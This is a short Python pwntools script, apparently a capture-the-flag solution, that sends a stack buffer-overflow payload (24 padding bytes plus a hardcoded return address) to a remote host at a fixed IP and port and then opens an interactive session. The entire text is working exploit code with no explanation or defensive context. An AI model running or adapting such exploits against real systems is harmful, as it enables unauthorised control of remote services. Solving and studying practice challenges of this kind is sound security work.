from pwn import *

payload = "A"*24+"\x85\x85\x04\x08"

p = remote('52.163.126.205', 33332)
p.recv()
p.sendline(payload)
p.interactive()
